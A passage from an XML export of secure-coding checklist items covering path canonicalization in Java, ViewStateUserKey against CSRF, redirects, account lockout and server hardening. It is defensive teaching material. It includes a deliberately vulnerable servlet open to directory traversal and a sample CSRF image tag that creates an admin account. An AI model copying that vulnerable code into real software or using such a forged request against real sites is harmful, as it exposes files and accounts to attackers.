&lt;li&gt;Custom Java Validator class &lt;/li&gt;&lt;li&gt;Regular expression use (&lt;strong&gt;java.util.regex&lt;/strong&gt;) &lt;/li&gt;&lt;li&gt;Method names that contain &lt;strong&gt;validate&lt;/strong&gt; or &lt;strong&gt;validator&lt;/strong&gt;
&lt;/li&gt;&lt;li&gt;Client-side validation is often linked to events:
&lt;ul&gt;
&lt;li&gt;onSubmit &lt;/li&gt;&lt;li&gt;onChange &lt;/li&gt;&lt;li&gt;onFocus &lt;/li&gt;&lt;li&gt;onBlur &lt;/li&gt;&lt;li&gt;onKeyDown/Press/Up&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; If you identify client-side validation in your application, verify that there is a corresponding validation routine on the server side as well. Consult the
&lt;a href="?#ruledisplay:D089D9CA-860C-4F98-BC7E-5AD7553DB6DD"&gt;Client-Side Validation is Not Relied On&lt;/a&gt; checklist for more details.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure validation includes file names and paths. &lt;/strong&gt;Attackers will attempt several different file name or path representations in order to change the file names or paths the application writes to. These types of attacks are called Canonicalization
 Attacks and occur when input applied to the file system is not in the simplest form and is not validated in the right context or form.&lt;br&gt;
&lt;br&gt;
Validation should be performed on input in the same form that it will be used in. Validating input before it is decoded into another form or before its full path is expanded leaves your application open to attack.&lt;br&gt;
&lt;br&gt;
Validation routines for file names and paths should perform two types validation on the input:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;A hard-coded base directory should be used in conjunction with the input&lt;/strong&gt;: The base directory (and its children) should be the only location that the application can physically write to and should also be the only location that user-supplied
 input can navigate. Establishing a proper base directory ensures that users do not directly have access to system files. If your application is Windows-based, ensure that your base directory is located in a partition that is different than the partition hosting
 the critical system services.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Whitelisting should be performed on the input&lt;/strong&gt;: Whitelisting ensures that file names and paths are provided in the intended format, and that unexpected formats are discarded.
&lt;/p&gt;
&lt;p&gt;These two paths represent the same file:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;d:\myapp\temp\..\temp\file.dat&lt;br&gt;d:\myapp\temp\..\temp\..\temp\file.dat&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;The paths above can continue to be expanded out in similar fashion and still refer to the same file. Types of encodings (&lt;strong&gt;d%3A%5Cmyapp%5Ctemp%5Cfile.dat&lt;/strong&gt;) can be used in order to further complicate the representation. Attackers hope that the
 more complicated the representation, the less likely it is that the developer wrote a case to handle it. The simplest form of these paths is:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;d:\myapp\temp\file.dat&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Therefore, check file names by obtaining the full name of the file&amp;nbsp;by calling the
&lt;strong&gt;java.io.File.getCanonicalPath()&lt;/strong&gt; method. Whitelisting will allow only expected formats and encodings be used by the application, which is most likely the simplest form of the file name or path. Ensure that whitelisting is applied to the input,
 using a regular expression, custom validator or similar method, and that input that does not match the whitelist is discarded.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check for common mistakes.&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Verify that all files are represented using a &lt;strong&gt;java.io.File&lt;/strong&gt; object instead of a
&lt;strong&gt;String&lt;/strong&gt; object. Using the &lt;strong&gt;File&lt;/strong&gt; object allows you to access the actual file and some useful and relevant information such as the file's size, parent, path, etc.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Check if your application's filesystem is case-sensitive. Because most UNIX based operating systems have case-sensitive filesystems,
&lt;strong&gt;FILE.DAT&lt;/strong&gt; and &lt;strong&gt;file.dat&lt;/strong&gt; represent&amp;nbsp;two different files. However, Windows has a case-insensitive filesystem; therefore,
&lt;strong&gt;FILE.DAT&lt;/strong&gt; and &lt;strong&gt;file.dat&lt;/strong&gt; represent the same file. If your application's filesystem is case-insensitive, make sure that the
&lt;strong&gt;CASE_INSENSITIVE&lt;/strong&gt; flag is specified when using regular expressions to validate your file inputs.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Verify the path delimiters that your application's filesystem uses and check if they are consistent throughout the code. For example, Windows uses '&lt;strong&gt;\&lt;/strong&gt;' or '&lt;strong&gt;/&lt;/strong&gt;' to distinguish directories inside a path while UNIX based systems
 use only '&lt;strong&gt;/&lt;/strong&gt;' to accomplish the same task.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;ol&gt;
&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code allows the user to read the contents of a report file, located in /myapp/temp/. Unfortunately, the code is missing filename validation; therefore the application is exposed to a directory traversal attack:&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;public final class ReportDownloader extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request,&lt;br&gt;                        HttpServletResponse response) throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            response.setContentType(&amp;quot;application/vnd.ms-excel&amp;quot;);&lt;br&gt;            String baseDir = &amp;quot;/myapp/temp/&amp;quot;;&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String filename = request.getParameter(&amp;quot;file&amp;quot;);&lt;br&gt;            BufferedReader fin;&lt;br&gt;            String data = &amp;quot;&amp;quot;;&lt;br&gt;            try&lt;br&gt;            {&lt;br&gt;                  File reportFile = new File(baseDir &amp;#43; filename);&lt;br&gt;                  // The application fails to validate the user-supplied filename&lt;br&gt;                  fin = new BufferedReader(new FileReader(reportFile));&lt;br&gt;                  StringBuilder sb = new StringBuilder();&lt;br&gt;                  while (data != null)&lt;br&gt;                  {&lt;br&gt;                        data = fin.readLine();&lt;br&gt;                        if (validateData(data))&lt;br&gt;                        {&lt;br&gt;                              sb.append(data);&lt;br&gt;                        }&lt;br&gt;                        else&lt;br&gt;                        {&lt;br&gt;                              // Add the appropriate logging and exception handling&lt;br&gt;                              // mechanisms. Consult the Exception Handling and&lt;br&gt;                              // Logging sections&lt;br&gt;                              out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                       &amp;#43;  &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;                              return;&lt;br&gt;                        }&lt;br&gt;                  }&lt;br&gt;                  out.println(sb.toString());&lt;br&gt;            }&lt;br&gt;            catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling mechanisms&lt;br&gt;                  // Consult the Exception Handling and Logging sections&lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43;  &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;            }            out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;      boolean validateData(String input)&lt;br&gt;      {&lt;br&gt;            // Implement a validation routine for the format of the reports&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F"&gt;Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;ol&gt;
&lt;/ol&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>d4ae5fa9-2156-42d1-8718-754a7df4e1f5</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>The ViewStateUserKey is used to Counter Cross-site Request Forgery Attacks</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Parameter Manipulation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that an unique key is assigned to each user's ViewState.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;A ViewState is the mechanism used by ASP.NET to keep track of server control state values. It is a hidden form field managed by the ASP.NET page framework and is an encoded aggregate of values of controls on a page. View state is enabled by default in ASP.NET
 and can be disabled or re-enabled at the machine, application, page, and control level by setting the
&lt;strong&gt;EnableViewState&lt;/strong&gt; property to &lt;strong&gt;false&lt;/strong&gt; or &lt;strong&gt;true&lt;/strong&gt; in config files.&lt;/p&gt;
&lt;p&gt;By default, there's nothing in the ViewState that ties its content to a particular user. The attacker can easily reuse the ViewState he obtained making legal access to the page to build a bogus request on behalf of another user. This is where
&lt;strong&gt;ViewStateUserKey&lt;/strong&gt; is useful.&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;ViewStateUserKey&lt;/strong&gt; property adds user-specific information to the view state. Setting the
&lt;strong&gt;ViewStateUserKey&lt;/strong&gt; property of the page in the &lt;strong&gt;Page_Init&lt;/strong&gt; event handler helps ensuring that any form information submitted came from the same user who requested the original page. It binds the content of the
&lt;strong&gt;ViewState&lt;/strong&gt; variable to individual users so that the malicious users cannot use the variable to generate an attack.&lt;/p&gt;
&lt;p&gt;This prevents &lt;a href="?#ruledisplay:2288423A-5696-41EA-A421-05EAD6460E4C"&gt;Cross Site Request Forgery&lt;/a&gt; attacks, where attackers attempt to use their ViewState in the context of another user or to otherwise post form data as though they were another user.
 These attacks are also called One-Click Attacks.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that your application's ASP.NET pages have Page_Init methods. &lt;/strong&gt;
Look for &lt;strong&gt;Page_Init&lt;/strong&gt; methods in your application's ASP.NET. The declaration for
&lt;strong&gt;Page_Init&lt;/strong&gt; is:&lt;/p&gt;
&lt;pre&gt;protected void Page_Init(object sender, EventArgs e)&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that Page.ViewStateUserKey is set during page initialization. &lt;/strong&gt;
Ensure &lt;strong&gt;Page.ViewStateUserKey&lt;/strong&gt; is initialized during page initialization. Example:&lt;/p&gt;
&lt;pre&gt;protected void Page_Init(object sender, EventArgs e&lt;br&gt;{&lt;br&gt;    Page.ViewStateUserKey = Session.SessionID;&lt;br&gt;}&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Suppose that a&amp;nbsp;web application does not set the &lt;strong&gt;ViewStateUserKey&lt;/strong&gt; property in the Page_Init event handler, and this application allows a user to change the state of the application in a single request. This combination means the&amp;nbsp;application
 is susceptible to a Cross Site Request Forgery Attack. &lt;/p&gt;
&lt;p&gt;For example, consider a web application that allows a logged-in administrator to create a new user sending a single GET request.&lt;/p&gt;
&lt;p&gt;This GET request looks like this:&lt;/p&gt;
&lt;pre&gt;GET http://teammentorexample.com/adduser.aspx?username=joe&amp;amp;password=1234&amp;amp;usertype=user HTTP/1.1&lt;/pre&gt;
&lt;p&gt;The attacker discovers that this request will create a new user and creates his own request which he embeds in an e-mail with the following image tag:&lt;/p&gt;
&lt;pre&gt;&amp;lt;img src=”http://teammentorexample.com/adduser.aspx?username=HACKER&amp;amp;password=TEST&amp;amp;usertype=admin” /&amp;gt;&lt;/pre&gt;
&lt;p&gt;When the victim’s (the administrator in this case) e-mail client attempts to download the image located at the above source, the request is made without the knowledge of the victim.
&lt;/p&gt;
&lt;p&gt;The Web page contains a hidden form field named __VIEWSTATE that is already filled with ViewState data. The ViewState can be re-used from a valid request that the attacker had previously made to the application. The ViewState content is not checked on the
 server or is only checked against tampering. The attacker lures the unsuspecting user into opening the email containing the malicious URL, causing the request to be sent to the server where the ViewState is valid. The server has no way of knowing that the
 ViewState originated from the attacker. ViewState validation does not counter this attack because the ViewState is valid and the page is executed under the security context of the victim user.&lt;/p&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:04A281E9-1078-48B4-ABBC-74CB259F8C92"&gt;Guideline: Use Page.ViewStateUserKey to Counter Cross Site Request Forgery Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>d561d88f-d407-4804-b098-42b1c29505c1</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>ASP.NET process account is configured for least privilege. </title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that ASP.NET process account is configured for least privilege if your application&amp;nbsp;does not use the default ASPNET account, which is a least-privileged account.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>d80b73f7-f6c9-4beb-b090-855ee2119327</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Destinations of redirects and forwards are calculated without user input</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Verify that destinations of redirects and forwards are calculated without user input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using input to calculate destinations of redirects or forwards may allow an attacker to create hyperlinks that appear to point to legitimate sites but redirect to malicious pages controlled by the attacker. This technique is often used by phishers to trick
 people into visiting fake sites that steal authentication credentials.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Look for code that handles parameters to see if it performs redirects or forwards based on input. Redirects are also known as &amp;quot;transfers&amp;quot; in .NET. Ideally, redirects and forwards should not rely on user input to calculate their destinations.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Perform the following actions to calculate destinations of redirects and forwards without user input:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find redirects and forwards.&lt;/strong&gt; Find all pages that perform redirects or forwards. Redirects are also known as &amp;quot;transfers&amp;quot; in .NET.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify dangerous redirects and forwards.&lt;/strong&gt; Find all redirects and forwards that rely on user input to calculate their destinations.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rewrite redirects and forwards.&lt;/strong&gt; Consider making design or code changes to get rid of each redirect or forward, if possible. If a redirect or forward is absolutely necessary, consider how it may be rewritten to operate without user input
 - this is usually possible based on assumptions made in the application design.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about unvalidated redirects and forwards, please see &lt;a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards"&gt;
http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:f53c44e4-a08e-437c-a40d-ec3db00baca7"&gt;Calculate Destinations of Redirects and Forwards Without User Input&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:c2f99851-794e-4cda-a1ee-71447d93bfc8"&gt;Don't Use Redirects or Forwards if Possible&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33"&gt;Validate Destinations of Redirects and Forwards&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7"&gt;URL Redirection Attack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608"&gt;How to Test for URL Redirection Bugs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178"&gt;Phishing Attack&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>d8748c6c-60cc-47e7-b07c-6becf5f993df</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Inactive User Accounts are Automatically Locked</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authorization</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure the application automatically locks inactive user accounts. Verify that all instances of locking inactive accounts are logged.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Inactive user accounts increase the attack surface of the application and can be used by an attacker as a means of entry.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Follow these steps during the design phase to make sure your application has the capability to lock its inactive user accounts:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify your application stores the user's last login/inactivity information.
&lt;/strong&gt;Check if your application has the necessary procedures in place to store and retrieve last login and lockout information about its users. Common locations for storing such information are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Database that stores user account information &lt;/li&gt;&lt;li&gt;Data structures (e.g. Java class) that represent user accounts &lt;/li&gt;&lt;li&gt;Routines that handle user login &lt;/li&gt;&lt;li&gt;Routines that retrieve and update user account information&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify your application has a lockout policy. &lt;/strong&gt;An account lockout policy is typically application specific. Review your application's requirements and design specifications. Check for the following functionality:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A mechanism for determining user inactivity &lt;/li&gt;&lt;li&gt;A mechanism for locking inactive accounts &lt;/li&gt;&lt;li&gt;A mechanism for unlocking disabled accounts &lt;/li&gt;&lt;li&gt;Verify that the last-login timestamp is reset to the current timestamp upon a successful authentication attempt&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify the lockout policy is enforced by default. &lt;/strong&gt;Make sure the functionality that enforces the lockout policy is enabled by default during deployment.
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that only users with administrative privileges can amend your application's lockout policy.
&lt;/li&gt;&lt;li&gt;Verify that all instances of modifying the lockout policy are logged. &lt;/li&gt;&lt;li&gt;Check the following locations in the code to determine if the lockout policy is fully enforced:
&lt;ul&gt;
&lt;li&gt;Account administration routines &lt;/li&gt;&lt;li&gt;Background database processes that perform user account maintenance &lt;/li&gt;&lt;li&gt;Authentication routines&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following segment illustrates the user database of a multi-user application. In its current state, the application logs the last time the user has logged in but does not enforce a lockout policy for its inactive users; therefore, an attacker can gain
 unauthorized access to the application by compromising an inactive account.&lt;/p&gt;
&lt;pre&gt;sql&amp;gt; select username, locked, last_login_date from users;&lt;br&gt;&amp;#43;----------&amp;#43;--------&amp;#43;-----------------&amp;#43;&lt;br&gt;| username | locked | last_login_date |&lt;br&gt;&amp;#43;----------&amp;#43;--------&amp;#43;-----------------&amp;#43;&lt;br&gt;| adam     |      0 |      2006-10-11 |&lt;br&gt;| sue      |      0 |      2006-10-11 |&lt;br&gt;| jim      |      0 |      2006-10-01 |&lt;br&gt;| richard  |      0 |      2006-10-01 |&lt;br&gt;| julie    |      0 |      2006-09-23 |&lt;br&gt;| sam      |      0 |      2006-06-23 |&lt;br&gt;&amp;#43;----------&amp;#43;--------&amp;#43;-----------------&amp;#43;&lt;/pre&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:45CAB29F-B502-4524-B054-D507AD601748"&gt;Guideline: Automatically Lock Inactive User Accounts (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>d8a09762-4ca7-4cdb-ba5f-5e60708ba73e</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Administrator account is renamed and has a strong password.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that administrator account is renamed and has a strong password to improve security.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;The default local Administrator account is a target for malicious use because of its elevated privileges on the computer. To improve security, rename the default Administrator account and assign it a strong password.&lt;/p&gt;
&lt;p&gt;If you intend to perform local administration, configure the account to deny network logon rights and require the administrator to log on interactively. By doing so, you prevent users (well intentioned or otherwise) from using the Administrator account to
 log on to the server from a remote location. If a policy of local administration is too inflexible, implement a secure remote administration solution.
&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>dbca5b87-2fb0-462e-a16f-c0bd06e27abe</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Administrative interfaces are enumerated and secured.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the administrative interfaces are enumerated and secured when securing your network switches.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use Terminal Access Controller Access Control System (TACACS) or Remote Authentication Dial-In User Service (RADIUS) authentication for highly secure environments as a means of limiting administrative access to the network.
&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>dc099847-55d7-46b5-b316-e88f4b78aafe</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>A custom least-privileged anonymous account is created for anonymous access...</title>
    <topic>Security</topic>
    <technology>Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that a custom least-privileged anonymous account is created if your applications require anonymous access.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;If your applications support anonymous access (for example, because they use a custom authentication mechanism such as Forms authentication), create a custom least privileged anonymous account. If you run IISLockdown, add your custom user to the Web Anonymous
 Users group that is created. IISLockdown denies access to system utilities and the ability to write to Web content directories for the Web Anonymous Users group.&lt;/p&gt;
&lt;p&gt;If your Web server hosts multiple Web applications, you may want to use multiple anonymous accounts, one per application, so that you can secure and audit the operations of each application independently.&lt;/p&gt;
&lt;h1&gt;Additional Reosurces&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about hosting multiple Web applications see Chapter 20, &amp;quot;&lt;a href="http://msdn.microsoft.com/en-us/library/aa302436.aspx"&gt;Hosting Multiple Web Applications&lt;/a&gt;.&amp;quot;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>de6b92dd-e424-4a75-931e-5618c42c6aa6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>IIS banner information is restricted (IP address in content location disabled).</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
